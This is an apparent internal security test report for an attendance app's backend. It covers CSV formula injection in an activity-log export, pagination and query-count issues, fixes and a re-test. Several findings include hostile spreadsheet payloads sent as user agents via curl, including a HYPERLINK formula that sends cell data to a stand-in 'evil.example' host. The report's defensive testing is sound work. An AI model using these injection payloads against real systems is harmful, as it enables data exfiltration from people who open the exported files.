# Phase 6 – Security report (dashboards, activity log CSV export)

Date: 2026-11-13. Tester: backend-security-tester. Branch `claude/upbeat-noether-f7defe` (HEAD 1134ced).
Environment: local only, own database `attendance_sec6`. Production-mode server
`DB_DATABASE=attendance_sec6 APP_ENV=production APP_DEBUG=false QUEUE_CONNECTION=sync MAIL_MAILER=log PHP_CLI_SERVER_WORKERS=8 php artisan serve --port=8186`.
No email or push was sent.

Scripts:
- `tests/security/Phase6SecurityTest.php` – `DB_DATABASE=attendance_sec6 vendor/bin/pest tests/security/Phase6SecurityTest.php` (16 checks; the failing ones are P6-01, P6-03, P6-04, P6-05).
- `tests/security/phase6_seed.php` – seeds 300 employees, one month of attendance (3 tasks + 3 clients per day each) and 200,000 activity logs; prints a super admin and an employee token.
- `tests/security/phase6_http.sh SA_TOKEN EMP_TOKEN` – timings, authorization, export headers, hourly limit over HTTP.

## Findings

### P6-01 – CSV injection through the `;` separator (French/European locales) – Medium
- Endpoint: `GET /api/admin/activity-logs/export` (`ActivityLogController::cell` / `fputcsv`).
- Cause: `cell()` only checks the first character of the whole field. `fputcsv` quotes a field only when it contains `,` `"` space, tab or newline, so `x;=HYPERLINK("http://evil.example/?"&A1;"x")` (no space) is written unquoted. Excel/LibreOffice with a `;` list separator (French locale – the documentation of the project is French) split the line on `;` and the second part becomes a formula cell. The user agent is fully attacker-controlled and is stored for failed sign-ins (unauthenticated).
- Steps: `curl -A 'Mozilla;=HYPERLINK("http://evil.example/?"&A1;"x")' -X POST .../api/auth/login ...` (wrong password), then export as super admin and open in Excel with French regional settings. Test `P6-01 no cell starts a formula when the file is opened with a semicolon separator` (fails: two formula cells).
- Expected: no cell can start a formula whatever the separator.
- Fix: enclose every field in quotes (write the CSV line manually, or use `fputcsv` with a field that always forces enclosure, e.g. replace by a small writer `'"'.str_replace('"','""',$v).'"'`), and/or neutralize when any of `= + - @ \t \r` follows a `;` or `,` (simplest robust option: always quote + prefix rule). Alternatively export with `;` and also neutralize after `,`.

### P6-02 – Leading whitespace / unicode lookalikes not neutralized – Info
- `cell(' =1+1')`, `cell("\u{FF1D}1+1")` (full-width equals), `cell("\n=1+1")` are kept as is. Current Excel and LibreOffice do not evaluate them (verified by behaviour knowledge, not by opening files here); recorded for awareness. Optional hardening: apply the prefix rule after `ltrim()` of whitespace and NFKC normalization.

### P6-03 – Export uses OFFSET pagination: duplicated / skipped rows when logs are written during the export, quadratic cost – Low
- `export()` iterates `$query->lazy(500)` ordered by `created_at desc, id desc` → `limit 500 offset N` queries. Any log written while streaming (every sign-in, the `logs.exported` entry of a parallel export, jobs) shifts all rows by one: the row at a chunk boundary is written twice (test `P6-03`: 1,201 rows for 1,200 distinct, the inserted row is not even the duplicate). A large export of 100k rows takes ~200 OFFSET queries of growing cost (7.2 s locally for 100k rows on 200k logs).
- Fix: freeze the upper bound before streaming (`where('id', '<=', $maxIdAtStart)`) and iterate with keyset pagination: `->lazyByIdDesc(500, 'id')` (order by `id desc` only – ids are monotonic with `created_at`) or a cursor on `(created_at, id)`.

### P6-04 – `today.checked_in` counts blocked / deleted / not-yet-member employees – Low
- Endpoint: `GET /api/admin/dashboard`, `DashboardService::adminToday`.
- `checked_in` = all employee attendances of the day (including `withTrashed()` and blocked accounts and people on leave), while `expected`/`missing` only use active members. Test `P6-04`: expected 2, checked_in 2, missing 1 (checked_in + missing = 3 > expected). Not a data leak (counts only), but the figures are inconsistent and reveal activity of blocked accounts.
- Fix: count `checked_in` among the same filtered employee set (or return `checked_in_expected` and `checked_in_other` separately).

### P6-05 – N+1 queries on the admin dashboard (≈1 s with 300 employees) – Medium (availability)
- `adminToday()` and `WeeklyWindow::expectedEmployees()` call `WorkCalendar::dayStatus()` per employee: 3 queries per employee each (holidays, leaves, work_schedules). Measured with 300 employees: **1,775 queries, ~940 ms in-process, 1.03–1.14 s over HTTP** (5 runs). With 2 employees: 23 queries; 62 employees: 382 (test `P6-05`). The holiday lookup is the same for every employee (600 identical queries).
- The endpoint is polled by every admin holding any attendance/report tier and is not specifically throttled; on shared hosting a few admins refreshing can saturate PHP workers/DB connections.
- Fix: preload once per request – holiday for the date (1 query), leaves overlapping the date for all users (`whereIn`), latest work schedule per user (`distinct on (user_id)`); pass them into a batched `dayStatus`. Optionally cache the admin dashboard 30–60 s per tier set. Also `whereDate('work_date', …)` generates `"work_date"::date = ?`, which prevents use of the `work_date` index on a `date` column – use `where('work_date', $date)`.
- Note: month `services_top` loads every client row of the period into Eloquent models (≈20k rows here, peak 56 MB); use a `GROUP BY service_key` aggregate query instead.

## Measurements (local, 300 employees, ~6,900 attendances, ~20,700 tasks and clients, 200,000 logs)
| Request | Result |
|---|---|
| `GET /admin/dashboard` (super admin) | 200, 1.03–1.14 s, 1,775 queries |
| `GET /me/dashboard` (employee) | 200, 44–59 ms, 37 queries (per-day `dayStatus` loop, bounded by 7 days) |
| `GET /admin/activity-logs/export` (no filter) | 200, capped at 100,000 rows, 29 MB, 7.2 s, worker RSS peak 62 MB (streaming OK, no memory blow-up) |

## Tests that passed
- Export refused (403) to employees, `view_logs` admins and an admin holding every tier; guests 401.
- Row cap (`log_export_max_rows`) respected; filters (`event`, …) applied; invalid `event` (`a%`) and invalid dates → 422 (no LIKE wildcard injection).
- `logs.exported` security entry written with filters, row count and truncation flag.
- Hourly limit (`log_export_per_hour`): 429 after the limit, over HTTP and in-process; `X-RateLimit-*` headers.
- Classic CSV prefixes `= + - @ \t \r` neutralized with `'`.
- Export response: `Content-Disposition: attachment`, `text/csv`, `Cache-Control: no-store`, `nosniff`, CSP `default-src 'none'`; no framework/version headers.
- Employee dashboard returns only the caller's figures; `?user_id=` ignored; no other user's data.
- Admin dashboard: employee → 403; no names, emails or client names in the payload (counts only); sections omitted without the tier (backend tests + spot checks).
- Streaming export constant memory (62 MB RSS for a 29 MB file).

## Fixes applied (attendance-backend, 2026-11-13)
- **P6-01 / P6-02 – fixed.** `ActivityLogController::line()` writes every field in double quotes (CRLF lines). `cell()` NFKC-normalizes the text (full-width `＝` → `=`), then inserts `'` before `= + - @ \t \r \n` at the field start (also after leading whitespace) and after every `;` or `,` (+ optional whitespace). The P6-02 check in `Phase6SecurityTest.php` was updated to assert the hardened output. Feature tests: `tests/Feature/Logs/ActivityLogTest.php` (dataset of payloads, quoting).
- **P6-03 – fixed.** The export freezes `max(id)` before streaming and iterates `lazyByIdDesc(500, 'id')` (keyset, no OFFSET); rows written during the export are excluded, no duplicates/skips. The `P6-03` security test now hooks the chunk query on `limit` (there is no `offset` any more). Measured: 100,000-row export (31 MB) in 5.1 s over HTTP (was 7.2 s).
- **P6-04 – fixed.** `today.checked_in` counts only the expected employees (`checked_in + missing = expected`); new field `checked_in_not_expected` (active members who checked in on a day they were not expected). Blocked/deleted accounts and not-yet-members never count. OpenAPI updated (additive).
- **P6-05 – fixed.** New batch API `WorkCalendar::dayStatuses(users, date)` (3 queries: holiday, leaves `whereIn`, latest schedule per user with `DISTINCT ON`) shared with `dayStatus()` through one rule; used by the admin dashboard, `WeeklyWindow::expectedEmployees` (dashboard week, reminders, close), the check-in reminder, `/admin/reports/daily` and `/admin/attendance/day`. Plain `work_date` / `date` comparisons (no `::date` cast) in the dashboard, calendar and reminder. `services_top` computed with `GROUP BY service_key` (same order/labels as `ReportBuilder::services`). Dedicated `throttle:dashboard` on both dashboards (setting `dashboard_requests_per_minute`, default 30). Measured on the seed (300 employees, 200k logs): **18 queries, 76–96 ms in-process (was 1,775 / ~940 ms), 98–139 ms over HTTP (was 1.03–1.14 s), 29 MB peak**. Test asserts ≤ 30 queries with 300 employees and no growth vs. 4 employees; batch statuses equal per-user statuses.
- Results: full suite 477+ tests green, PHPStan clean, `DB_DATABASE=attendance_sec6 vendor/bin/pest tests/security/Phase6SecurityTest.php` 16/16 green.

## Re-test after fixes (backend-security-tester, 2026-11-13)
Environment: fresh `attendance_sec6` (`migrate:fresh` + `phase6_seed.php 300 200000`), production-mode `php artisan serve --port=8186` (8 workers), commit `1a981ee`.

| ID | Status | Evidence |
|---|---|---|
| P6-01 | **Fixed** | Failed sign-ins over HTTP with hostile user agents (`Mozilla;=HYPERLINK(...)`, `x;@SUM(1)`, `a, =1+1`, `＝1+1`, ` -2+3`, `x,@A1`, ideographic space + `=`), then `GET /admin/activity-logs/export?type=security`. Parsed quote-aware with `,` and naive split on `,`: 0 formula cells. With `;` (quote-aware and naive): 0 formula cells except the residual case P6-06. Every field quoted, CRLF lines. |
| P6-02 | **Fixed** | `cell()` checked directly: U+3000/U+2003 + `=`, `＋ ﹢ ＠ －` all prefixed after NFKC. Zero-width space / BOM before `=` are left verbatim (spreadsheets do not evaluate them: Info, no action). |
| P6-03 | **Fixed** | Full export over HTTP while 4,000 rows were inserted in parallel: 100,000 rows (cap), the concurrent rows included form a contiguous prefix (`conc 0..68`, inserted before the snapshot), none after the frozen max id, no duplicated log (the 7 identical lines are distinct `logs.exported` entries in the same second). 6.2 s, 31 MB. |
| P6-04 | **Fixed** | `/admin/dashboard` on the seed: `expected 282 = checked_in 282 + missing 0`, `checked_in_not_expected 18` reported separately. |
| P6-05 | **Fixed** | Admin dashboard 118–159 ms over HTTP (was 1.03–1.14 s), employee dashboard 85–119 ms. Security test: 18–19 queries independent of the number of employees. Throttle: admin dashboard 429 from the 31st call/min, employee dashboard 429 from the 31st call. `/admin/attendance/day` 80 ms, `/admin/reports/daily` 0.61 s (300 employees with tasks; acceptable). |

Review of the two assertions edited by attendance-backend in `tests/security/Phase6SecurityTest.php`:
- P6-02: now asserts the hardened output (`' =1+1`, `'=1+1` for `＝1+1`, `'\n=1+1`). Correct and stricter than before; accepted.
- P6-03: the hook now matches `limit` instead of `offset`. Still meaningful: it injects a row during the first chunk query and `expect($offsetQueries)->toBeGreaterThan(0)` guarantees the hook fired (the test cannot pass vacuously). The variable name `offsetQueries` is now misleading (cosmetic). Accepted.

Batch calendar regression check: new script `tests/security/phase6_calendar_diff.php` (random schedules with up to 3 versions, days off, remote days, overlapping multi-day leaves, 4 holidays, blocked accounts, accounts created during the period; runs in a rolled-back transaction). `DB_DATABASE=attendance_sec6 php tests/security/phase6_calendar_diff.php 60 70` → 4,200 user-days, **0** differences between `dayStatuses()` and `dayStatus()`, **0** differences between `WeeklyWindow::expectedEmployees()` and the per-user filter over 70 days (used by reminders, weekly close, daily report and attendance day). The `(user_id, effective_from)` unique constraint removes any tie-break ambiguity between the two implementations. Full suite: 477/477 green; `Phase6SecurityTest.php` 16/16 green.

### P6-06 – A double quote between the separator and the trigger escapes the after-separator neutralization – Low (new)
- Affected: `App\Http\Controllers\Admin\ActivityLogController::cell()` (regex `([;,]\s*)(?=[=+\-@\t\r\n])`).
- Steps: failed sign-in with user agent `z;"=1` (`curl -A 'z;"=1' -H 'Accept: application/json' -H 'Content-Type: application/json' -d '{"email":"<existing>","password":"wrongwrong","device_id":"secdev-100000000004"}' http://127.0.0.1:8186/api/auth/login`), export `?type=security`. The field is written `"z;""=1"` (no `'` inserted). Opening the comma file with `;` as separator, a parser that leaves quoted mode after the first `","` (Python csv, and Excel/LibreOffice behave similarly once a field is "quoted then followed by text") yields a cell starting `=1"...`.
- Observed: 1 formula-like cell with `;`. Expected: 0.
- Impact: low – requires opening the comma file with a `;` locale and a parser quirk; the result is usually a broken formula. Already Medium-mitigated by quoting.
- Suggested fix: allow quotes (and other non-alphanumeric padding) between separator and trigger, e.g. `preg_replace('/([;,][\s"\']*)(?=[=+\-@\t\r\n])/u', "$1'", $s)`, and add `z;"=1` / `z,"@x` to the feature dataset.

### Summary after re-test
| ID | Severity | Status |
|---|---|---|
| P6-01 | Medium | Fixed |
| P6-02 | Info | Fixed |
| P6-03 | Low | Fixed |
| P6-04 | Low | Fixed |
| P6-05 | Medium | Fixed |
| P6-06 | Low | Open (new) |

No Critical/High finding open.
